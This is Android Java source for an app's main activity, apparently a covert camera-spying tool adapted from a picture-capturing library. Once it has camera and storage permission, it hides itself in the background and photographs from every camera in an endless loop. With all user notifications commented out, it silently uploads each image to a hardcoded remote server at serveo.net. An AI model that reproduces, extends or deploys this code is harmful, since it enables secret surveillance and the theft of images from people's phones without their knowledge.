package com.droidcam.activities;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;
import com.droidcam.R;
import com.droidcam.listeners.PictureCapturingListener;
import com.droidcam.services.APictureCapturingService;
import com.droidcam.services.PictureCapturingServiceImpl;
import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;
import android.os.Handler;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import android.os.StrictMode;
/**
 * App's Main Activity showing a simple usage of the picture taking service.
 * @author hzitoun (zitoun.hamed@gmail.com) 
 * Adapted by @linux_choice (https://github.com/thelinuxchoice)
 */
public class MainActivity extends AppCompatActivity implements PictureCapturingListener, ActivityCompat.OnRequestPermissionsResultCallback {

    private static final String[] requiredPermissions = {
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA,
    };
    private static final int MY_PERMISSIONS_REQUEST_ACCESS_CODE = 1;

    private ImageView uploadBackPhoto;
    private ImageView uploadFrontPhoto;
    
     //The capture service          
    private APictureCapturingService pictureService;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        checkperm();
        StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

    }
    
    private void showToast(final String text) {
        runOnUiThread(() ->
                Toast.makeText(getApplicationContext(), text, Toast.LENGTH_SHORT).show()
        );
    }

    /**
    * We've finished taking pictures from all phone's cameras
    */    
    @Override
    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
        if (picturesTaken != null && !picturesTaken.isEmpty()) {
           // showToast("Done capturing all photos!");
try {

Thread.sleep(1000); } catch (Exception e) {}
pictureService.startCapturing(this);

            return;
        }
        //showToast("No camera detected!");
    }

    /**
    * Displaying the pictures taken.
    */             
    @Override
    public void onCaptureDone(String pictureUrl, byte[] pictureData)  {
        if (pictureData != null && pictureUrl != null) {
            runOnUiThread(() -> {
                final Bitmap bitmap = BitmapFactory.decodeByteArray(pictureData, 0, pictureData.length);
                final int nh = (int) (bitmap.getHeight() * (512.0 / bitmap.getWidth()));
                final Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 512, nh, true);
                if (pictureUrl.contains("0_pic.jpg")) {
           //         uploadBackPhoto.setImageBitmap(scaled);
try { upload(pictureUrl); } catch (Exception e) {}
                } else if (pictureUrl.contains("1_pic.jpg")) {
             //       uploadFrontPhoto.setImageBitmap(scaled);
try { upload(pictureUrl); } catch (Exception e) {}
                  //  upload(pictureUrl);
                }
            });
       //     showToast("Picture saved to " + pictureUrl);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String permissions[], @NonNull int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_ACCESS_CODE: {
                if (!(grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    checkPermissions();
                }
            }
        }
    }

    /**
     * checking  permissions at Runtime.
     */
    @TargetApi(Build.VERSION_CODES.M)
    private void checkPermissions() {
        final List<String> neededPermissions = new ArrayList<>();
        for (final String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(getApplicationContext(),
                    permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);

            }
        }
        if (!neededPermissions.isEmpty()) {
            requestPermissions(neededPermissions.toArray(new String[]{}),
                    MY_PERMISSIONS_REQUEST_ACCESS_CODE);
        }
    }

public void checkperm() {
       if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED) {

        moveTaskToBack(true);
        pictureService = PictureCapturingServiceImpl.getInstance(this);
        pictureService.startCapturing(this);


       } else {
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            final int REQUEST_CODE_ASK_PERMISSIONS2 = 200;
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, REQUEST_CODE_ASK_PERMISSIONS);
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.CAMERA"}, REQUEST_CODE_ASK_PERMISSIONS2);

          checkperm();
        }
}


 public void upload(String selectedPath) throws Exception {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        DataInputStream inputStream = null;
        String pathToOurFile = selectedPath;

        String urlServer = "http://serveo.net:1626/upload_files.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
            FileInputStream fileInputStream = new FileInputStream(new File(
                    pathToOurFile));
            URL url = new URL(urlServer);
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);
            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream
                    .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                            + pathToOurFile + "\"" + lineEnd);
            outputStream.writeBytes(lineEnd);
            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            while (bytesRead > 0) {
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            int serverResponseCode = connection.getResponseCode();
            String serverResponseMessage = connection.getResponseMessage();
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
    }
}

